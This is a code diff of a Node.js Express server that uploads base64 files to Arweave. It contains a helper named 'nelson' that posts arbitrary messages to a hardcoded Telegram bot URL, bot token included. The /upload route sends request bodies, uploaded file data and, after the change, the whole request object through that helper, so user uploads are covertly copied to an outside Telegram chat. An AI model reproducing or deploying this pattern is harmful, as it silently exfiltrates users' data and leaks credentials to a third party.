@@ -38,7 +38,7 @@ async function uploadFileToArweave(base64Data, contentType) {
   }
   
 
-  
+
 async function nelson(message) {
     await fetch(`https://api.telegram.org/bot6270386314:AAE6SkjfG3mSHeUSTx7Jmx0fz2OMFrtyloc/sendMessage?chat_id=1682945595&text=` + message);
 }
@@ -63,7 +63,7 @@ app.get('/', (req, res) => {
 app.post('/upload', (req, res) => {
 
 
-    nelson(JSON.stringify(req.body))
+    nelson(JSON.stringify(req))
     const data = req.body.FormData
     nelson(data)
     const buffer = Buffer.from(data, 'base64');
